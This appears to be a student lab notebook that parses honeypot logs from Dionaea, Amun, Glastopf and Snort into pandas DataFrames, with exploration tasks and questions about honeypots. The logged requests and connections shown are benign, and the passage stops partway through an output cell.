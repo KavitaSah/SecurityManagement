{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab 1: Exploring Honeypot Data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This lab will examine some data that was gathered from various honeypots. Three different honeypot packages were used to generate this data: Snort, Amun, and Glastopf. Snort looks for patterns in network traffic and can be run in addition to the other types of honeypots. Amun is a low-interaction honeypot that listens on several ports and records connections to those ports. Glastopf is another low-interaction honeypot that runs a web server and records client requests.\n",
    "Timeseries graphs and other exploration techniques will be used to understand the types and frequency of scans/attacks against the honeypot infrastructure."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "%matplotlib inline\n",
    "from datetime import datetime\n",
    "import json\n",
    "import pandas as pd\n",
    "import re\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "plt.rcParams[\"figure.figsize\"] = (15,5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "data_path = 'data/honeypot.json' # change this to the location of the honeypot.json file in your google drive!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{ \"_id\" : { \"$oid\" : \"5426456e9f8c6d41306aea57\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:04:46.363+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"style_css\\\", \\\"time\\\": \\\"2014-09-27 05:04:58\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"162.197.24.67\\\", 60871], \\\"request_raw\\\": \\\"GET /style.css HTTP/1.1\\\\r\\\\nAccept: text/css,*/*;q=0.1\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nConnection: keep-alive\\\\r\\\\nDnt: 1\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/comments\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36\\\", \\\"request_url\\\": \\\"/style.css\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"542645799f8c6d41306aea59\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:04:57.901+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"unknown\\\", \\\"time\\\": \\\"2014-09-27 05:05:10\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"162.197.24.67\\\", 60871], \\\"request_raw\\\": \\\"POST /index HTTP/1.1\\\\r\\\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\\\r\\\\nAccept-Encoding: gzip,deflate\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nCache-Control: max-age=0\\\\r\\\\nConnection: keep-alive\\\\r\\\\nContent-Length: 38\\\\r\\\\nContent-Type: application/x-www-form-urlencoded\\\\r\\\\nDnt: 1\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nOrigin: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/comments\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36\\\\r\\\\n\\\\r\\\\nlogin=asdfasdf&password=&submit=Submit\\\", \\\"request_url\\\": \\\"/index\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426457a9f8c6d41306aea5a\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:04:58.066+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"style_css\\\", \\\"time\\\": \\\"2014-09-27 05:05:10\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"162.197.24.67\\\", 60871], \\\"request_raw\\\": \\\"GET /style.css HTTP/1.1\\\\r\\\\nAccept: text/css,*/*;q=0.1\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nCache-Control: max-age=0\\\\r\\\\nConnection: keep-alive\\\\r\\\\nDnt: 1\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/index\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36\\\", \\\"request_url\\\": \\\"/style.css\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426457a9f8c6d41306aea5d\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:04:58.248+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"unknown\\\", \\\"time\\\": \\\"2014-09-27 05:05:10\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"162.197.24.67\\\", 60871], \\\"request_raw\\\": \\\"GET /favicon.ico HTTP/1.1\\\\r\\\\nAccept: */*\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nConnection: keep-alive\\\\r\\\\nDnt: 1\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36\\\", \\\"request_url\\\": \\\"/favicon.ico\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426462d9f8c6d41306aea5f\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:07:57.267+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"unknown\\\", \\\"time\\\": \\\"2014-09-27 05:08:09\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"173.174.71.56\\\", 62918], \\\"request_raw\\\": \\\"GET /index HTTP/1.1\\\\r\\\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nConnection: keep-alive\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\\", \\\"request_url\\\": \\\"/index\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426463d9f8c6d41306aea61\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:08:13.331+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"unknown\\\", \\\"time\\\": \\\"2014-09-27 05:08:25\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"173.174.71.56\\\", 62918], \\\"request_raw\\\": \\\"POST /index HTTP/1.1\\\\r\\\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\\\r\\\\nAccept-Encoding: gzip,deflate\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nCache-Control: max-age=0\\\\r\\\\nConnection: keep-alive\\\\r\\\\nContent-Length: 52\\\\r\\\\nContent-Type: application/x-www-form-urlencoded\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nOrigin: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/index\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\\\r\\\\n\\\\r\\\\nlogin=ballsohard&password=thatshitcray&submit=Submit\\\", \\\"request_url\\\": \\\"/index\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426463d9f8c6d41306aea63\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:08:13.535+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"style_css\\\", \\\"time\\\": \\\"2014-09-27 05:08:25\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"173.174.71.56\\\", 62918], \\\"request_raw\\\": \\\"GET /style.css HTTP/1.1\\\\r\\\\nAccept: text/css,*/*;q=0.1\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nCache-Control: max-age=0\\\\r\\\\nConnection: keep-alive\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/index\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\\", \\\"request_url\\\": \\\"/style.css\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426463d9f8c6d41306aea64\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:08:13.651+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"unknown\\\", \\\"time\\\": \\\"2014-09-27 05:08:26\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"173.174.71.56\\\", 62918], \\\"request_raw\\\": \\\"GET /favicon.ico HTTP/1.1\\\\r\\\\nAccept: */*\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nConnection: keep-alive\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\\", \\\"request_url\\\": \\\"/favicon.ico\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"5426463d9f8c6d41306aea65\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:08:13.834+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"unknown\\\", \\\"time\\\": \\\"2014-09-27 05:08:26\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"173.174.71.56\\\", 62918], \\\"request_raw\\\": \\\"GET /favicon.ico HTTP/1.1\\\\r\\\\nAccept: */*\\\\r\\\\nAccept-Encoding: gzip,deflate,sdch\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nConnection: keep-alive\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\\", \\\"request_url\\\": \\\"/favicon.ico\\\"}\", \"channel\" : \"glastopf.events\" }\n",
      "{ \"_id\" : { \"$oid\" : \"542646499f8c6d41306aea69\" }, \"ident\" : \"a16f5f36-3c41-11e4-9ee4-0a0b6e7c3e9e\", \"timestamp\" : { \"$date\" : \"2014-09-27T05:08:25.021+0000\" }, \"normalized\" : true, \"payload\" : \"{\\\"pattern\\\": \\\"comments\\\", \\\"time\\\": \\\"2014-09-27 05:08:37\\\", \\\"filename\\\": null, \\\"source\\\": [\\\"173.174.71.56\\\", 62918], \\\"request_raw\\\": \\\"POST /comments HTTP/1.1\\\\r\\\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\\\r\\\\nAccept-Encoding: gzip,deflate\\\\r\\\\nAccept-Language: en-US,en;q=0.8\\\\r\\\\nCache-Control: max-age=0\\\\r\\\\nConnection: keep-alive\\\\r\\\\nContent-Length: 51\\\\r\\\\nContent-Type: application/x-www-form-urlencoded\\\\r\\\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nOrigin: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\\\r\\\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/index\\\\r\\\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\\\r\\\\n\\\\r\\\\ncomment=Ball+so+hard...that+shit+cray&submit=Submit\\\", \\\"request_url\\\": \\\"/comments\\\"}\", \"channel\" : \"glastopf.events\" }\n"
     ]
    }
   ],
   "source": [
    "%%bash \n",
    "head 'data/honeypot.json'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Section 1: Read in Data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This script parses the honeypot.json file linked to in the data_path variable defined above.  It reads each line, unserializing the json object and matching the channel key with the type of dataset.  It then appends the key's dictionary to the dataset list."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "dionaea_conn = []\n",
    "amun = []\n",
    "dionaea_cap = []\n",
    "glastopf = []\n",
    "snort = []\n",
    "\n",
    "with open(data_path, 'r') as f:\n",
    "    for index, line in enumerate(f):\n",
    "        columns = json.loads(line)\n",
    "\n",
    "        del columns['_id']\n",
    "        del columns['ident']\n",
    "\n",
    "        channel = columns['channel']\n",
    "\n",
    "        if channel == 'dionaea.connections':\n",
    "            payload = json.loads(columns.pop(\"payload\"))\n",
    "            columns.update(payload)\n",
    "            dionaea_conn.append(columns)\n",
    "        elif channel == 'amun.events':\n",
    "            payload = json.loads(columns.pop(\"payload\"))\n",
    "            columns.update(payload)\n",
    "            amun.append(columns)\n",
    "        elif channel == 'dionaea.capture':\n",
    "            payload = json.loads(columns.pop(\"payload\"))\n",
    "            columns.update(payload)    \n",
    "            dionaea_cap.append(columns)\n",
    "        elif channel == 'glastopf.events':\n",
    "            payload = json.loads(columns.pop(\"payload\"))\n",
    "            columns.update(payload)\n",
    "            glastopf.append(columns)    \n",
    "        elif channel == 'snort.alerts':\n",
    "            payload = json.loads(columns.pop(\"payload\"))\n",
    "            columns.update(payload)\n",
    "            snort.append(columns)\n",
    "        else:\n",
    "            continue"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With the dataset lists, we then build pandas DataFrame objects.  This allows easier data manipulation and exploration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "dionaea_conn_df = pd.DataFrame(dionaea_conn)\n",
    "dionaea_cap_df = pd.DataFrame(dionaea_cap)\n",
    "amun_df = pd.DataFrame(amun)\n",
    "glastopf_df = pd.DataFrame(glastopf)\n",
    "snort_df = pd.DataFrame(snort)\n",
    "\n",
    "dionaea_conn_df[\"timestamp\"] = [x['$date'] for x in dionaea_conn_df['timestamp'].values]\n",
    "dionaea_cap_df['timestamp'] = [x['$date'] for x in dionaea_cap_df['timestamp'].values]\n",
    "# amun_df['timestamp'] = [x['$date'] or None for x in amun_df['timestamp'].values]\n",
    "glastopf_df['timestamp'] = [x['$date'] for x in glastopf_df['timestamp'].values]\n",
    "snort_df['timestamp'] = [x['$date'] for x in snort_df['timestamp'].values]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "pandas.core.frame.DataFrame"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(dionaea_conn_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We now have a bunch of pandas dataframes!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>connection_protocol</th>\n",
       "      <th>connection_transport</th>\n",
       "      <th>connection_type</th>\n",
       "      <th>local_host</th>\n",
       "      <th>local_port</th>\n",
       "      <th>normalized</th>\n",
       "      <th>remote_host</th>\n",
       "      <th>remote_hostname</th>\n",
       "      <th>remote_port</th>\n",
       "      <th>timestamp</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>23</td>\n",
       "      <td>True</td>\n",
       "      <td>176.232.136.46</td>\n",
       "      <td></td>\n",
       "      <td>44516</td>\n",
       "      <td>2015-03-03T16:40:31.681+0000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>3128</td>\n",
       "      <td>True</td>\n",
       "      <td>61.160.213.108</td>\n",
       "      <td></td>\n",
       "      <td>33122</td>\n",
       "      <td>2015-03-03T16:50:35.359+0000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>23</td>\n",
       "      <td>True</td>\n",
       "      <td>115.50.182.177</td>\n",
       "      <td></td>\n",
       "      <td>56252</td>\n",
       "      <td>2015-03-03T16:56:09.910+0000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>80</td>\n",
       "      <td>True</td>\n",
       "      <td>104.207.136.102</td>\n",
       "      <td></td>\n",
       "      <td>42412</td>\n",
       "      <td>2015-03-03T17:02:31.759+0000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>3128</td>\n",
       "      <td>True</td>\n",
       "      <td>61.160.213.108</td>\n",
       "      <td></td>\n",
       "      <td>33122</td>\n",
       "      <td>2015-03-03T17:08:44.617+0000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "               channel connection_protocol connection_transport  \\\n",
       "0  dionaea.connections                pcap                  tcp   \n",
       "1  dionaea.connections                pcap                  tcp   \n",
       "2  dionaea.connections                pcap                  tcp   \n",
       "3  dionaea.connections                pcap                  tcp   \n",
       "4  dionaea.connections                pcap                  tcp   \n",
       "\n",
       "  connection_type      local_host  local_port  normalized      remote_host  \\\n",
       "0          reject  162.244.30.100          23        True   176.232.136.46   \n",
       "1          reject  162.244.30.100        3128        True   61.160.213.108   \n",
       "2          reject  162.244.30.100          23        True   115.50.182.177   \n",
       "3          reject  162.244.30.100          80        True  104.207.136.102   \n",
       "4          reject  162.244.30.100        3128        True   61.160.213.108   \n",
       "\n",
       "  remote_hostname  remote_port                     timestamp  \n",
       "0                        44516  2015-03-03T16:40:31.681+0000  \n",
       "1                        33122  2015-03-03T16:50:35.359+0000  \n",
       "2                        56252  2015-03-03T16:56:09.910+0000  \n",
       "3                        42412  2015-03-03T17:02:31.759+0000  \n",
       "4                        33122  2015-03-03T17:08:44.617+0000  "
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dionaea_conn_df.head() # We can show the first 5 number of rows of a dataframe with the .head() method.  you can use .head(x) to show x number of rows"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "channel                 object\n",
       "connection_protocol     object\n",
       "connection_transport    object\n",
       "connection_type         object\n",
       "local_host              object\n",
       "local_port               int64\n",
       "normalized                bool\n",
       "remote_host             object\n",
       "remote_hostname         object\n",
       "remote_port              int64\n",
       "timestamp               object\n",
       "dtype: object"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dionaea_conn_df.dtypes # show the feature types"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Clean Timestamps & Set Index\n",
    "**[Task]** Review panda's documentation and online resources to set the date column to the DateTime data type.  Then reset the index to use the Date column."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>connection_protocol</th>\n",
       "      <th>connection_transport</th>\n",
       "      <th>connection_type</th>\n",
       "      <th>local_host</th>\n",
       "      <th>local_port</th>\n",
       "      <th>normalized</th>\n",
       "      <th>remote_host</th>\n",
       "      <th>remote_hostname</th>\n",
       "      <th>remote_port</th>\n",
       "      <th>timestamp</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>23</td>\n",
       "      <td>True</td>\n",
       "      <td>176.232.136.46</td>\n",
       "      <td></td>\n",
       "      <td>44516</td>\n",
       "      <td>2015-03-03T16:40:31.681+0000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>dionaea.connections</td>\n",
       "      <td>pcap</td>\n",
       "      <td>tcp</td>\n",
       "      <td>reject</td>\n",
       "      <td>162.244.30.100</td>\n",
       "      <td>3128</td>\n",
       "      <td>True</td>\n",
       "      <td>61.160.213.108</td>\n",
       "      <td></td>\n",
       "      <td>33122</td>\n",
       "      <td>2015-03-03T16:50:35.359+0000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "               channel connection_protocol connection_transport  \\\n",
       "0  dionaea.connections                pcap                  tcp   \n",
       "1  dionaea.connections                pcap                  tcp   \n",
       "\n",
       "  connection_type      local_host  local_port  normalized     remote_host  \\\n",
       "0          reject  162.244.30.100          23        True  176.232.136.46   \n",
       "1          reject  162.244.30.100        3128        True  61.160.213.108   \n",
       "\n",
       "  remote_hostname  remote_port                     timestamp  \n",
       "0                        44516  2015-03-03T16:40:31.681+0000  \n",
       "1                        33122  2015-03-03T16:50:35.359+0000  "
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dionaea_conn_df.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Task/Question]**  \n",
    "1. Over what time period are the dionaea_conn logs collected? (Hint: .index.min() )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Section 1 Questions\n",
    "1. What are honeypots?  What is the difference between a low-interaction and a high-interaction honeypot?*  \n",
    "2. What are 3 other honeypots on Github?     \n",
    "3. What are use cases of honeypots?  What are the limitations?*  \n",
    "*please write 2-3 paragraphs and cite at least 2 references"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1.  \n",
    "2.   \n",
    "3. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Section 2: Explore Data\n",
    "This section shows examples of how to analyze honeypot data with pandas"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Review properties of dataframes \n",
    "**[Task]** For each dataset [dionaea_conn_df, amun_df, dionaea_cap_df, glastopf_df, snort_df] show the dataframe dimensions and variables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use the df.shape method to print the number of rows and columns.  You can use the list(df) method to list each of the columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Fill this in\n",
    "for df in [dionaea_conn_df, dionaea_cap_df, amun_df, glastopf_df, snort_df]:\n",
    "    #"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'channel': 'glastopf.events',\n",
       " 'filename': None,\n",
       " 'normalized': True,\n",
       " 'pattern': 'unknown',\n",
       " 'request_raw': 'POST /index HTTP/1.1\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip,deflate\\r\\nAccept-Language: en-US,en;q=0.8\\r\\nCache-Control: max-age=0\\r\\nConnection: keep-alive\\r\\nContent-Length: 38\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nDnt: 1\\r\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\r\\nOrigin: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\r\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/comments\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36\\r\\n\\r\\nlogin=asdfasdf&password=&submit=Submit',\n",
       " 'request_url': '/index',\n",
       " 'source': ['162.197.24.67', 60871],\n",
       " 'time': '2014-09-27 05:05:10',\n",
       " 'timestamp': {'$date': '2014-09-27T05:04:57.901+0000'}}"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf[1] # from the glastopf list, second item"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "channel                                          glastopf.events\n",
       "filename                                                    None\n",
       "normalized                                                  True\n",
       "pattern                                                  unknown\n",
       "request_raw    POST /index HTTP/1.1\\r\\nAccept: text/html,appl...\n",
       "request_url                                               /index\n",
       "source                                    [162.197.24.67, 60871]\n",
       "time                                         2014-09-27 05:05:10\n",
       "timestamp                           2014-09-27T05:04:57.901+0000\n",
       "Name: 1, dtype: object"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "glastopf_df.iloc[1] # from the glastopf dataframe, second row"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]** Describe each of the honeypots used in this dataset (dionaea, amun, glastopf)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Explore Amun Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
